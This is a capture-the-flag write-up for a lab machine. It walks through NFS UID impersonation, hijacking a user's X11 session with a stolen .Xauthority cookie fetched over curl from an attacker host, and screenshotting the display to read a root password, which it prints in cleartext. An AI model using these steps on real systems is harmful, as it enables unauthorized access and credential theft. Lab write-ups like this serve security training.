## NFS Imitation 2.0

1) Thinking back to our initial enumeration, we recall the second file-share available, namely ross ' home  directory. As we initially saw and later confirmed, we need to imitate UID/GID 1001 in order to read its  contents; we locally apply the same commands as with hacker :
```
┌──(kali㉿kali)-[~]
└─$ sudo useradd hacker2   
[sudo] password for kali: 

┌──(kali㉿kali)-[~]
└─$ sudo usermod -u 1001 hacker2 

┌──(kali㉿kali)-[~]
└─$ sudo groupmod -g 1001 hacker2

┌──(kali㉿kali)-[~]
└─$ sudo umount /mnt             

┌──(kali㉿kali)-[~]
└─$ sudo mount -t nfs 10.10.11.191:/home/ross /mnt

┌──(kali㉿kali)-[~]
└─$ sudo su hacker2

```

Having successfully imitated ross and therefore gaining read privileges (though still not being able to write  anything to the directory), we can now take a look at files of interest.


------------------------
## X11

X is a portable, network-transparent window system for managing a windowed GUI. Essentially, when paired  with a display manager, it serves as a full-fledged GUI which you can use to run programs that might not run  headlessly.  

1) 7) Set up an HTTP server in the /tmp directory:
--> In the local Machine:
```
$ python3 -m http.server 80
```
2)  From the shell as alex, I’ll fetch this file with `curl`, and write it to `/tmp`:
--> In the Reverse Shell
```
$ curl http://10.10.14.209/.Xauthority -o /tmp/.Xauthority
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    49  100    49    0     0    426      0 --:--:-- --:--:-- --:--:--   426
$
```

<------------------------------------- In The Reverse Shell -------------------------------------------->

3) We can now interact with the display, since we have essentially hijacked ross ' session. In order to see what  is happening on the display, we can take a screenshot and open it locally. To do that, we need to know  which display ross is using, which can be done using the w command.
```
$ w        

 20:02:50 up 14:52,  1 user,  load average: 0.06, 0.02, 0.00                                                        
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                 
ross     tty7     :0               05:11   14:51m  1:27   0.05s /usr/libexec/gnome-session-binary --systemd --session=gnome  
```
4) I see the process
```
 $ ps -aux  

   ross        1612  0.1  5.0 777076 101556 ?       SLl  05:11   1:05 /usr/bin/keepassxc --pw-stdin --keyfile /usr/share/keepassxc/keyfiles/ross/keyfile.key /usr/share/keepassxc/databases/ross/Passwords.kdbx
   ```

5) I see the file that I have see in the process
```
$ cd /home/ross
$ cd Documents
$ ls
Passwords.kdbx
$ 
```

6) I spawn the file containing the root credentials
```
$  xwd -root -screen -silent -display :0 -out dump        
No protocol specified
xwd:  unable to open display ':0'
```

7) Setting the cookie is as easy as pointing the environment variable XAUTHORITY to our cookie file:
```
$ XAUTHORITY=/tmp/.Xauthority
$ export XAUTHORITY
```

8) I spawn the file containing the root credentials
```
$ xwd -root -screen -silent -display :0 -out dump 
$ 
```

9) I bring the file inside the Web Application
```
$ mv dump /var/www/html/
```

10) I download the file "dump"
---> In Local machine
```
┌──(kali㉿kali)-[~]
└─$ curl http://10.10.11.191/dump -o dump      
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 1878k  100 1878k    0     0  2089k      0 --:--:-- --:--:-- --:--:-- 2089k
```

11) I discover the credentials
```
┌──(kali㉿kali)-[~]
└─$ xwud -in dump
```

12) I have discover the password of root:
```
cah$mei7rai9A
```

13) I log into the ssh service and read root.txt:
```
┌──(kali㉿kali)-[~]
└─$ ssh root@10.10.11.191
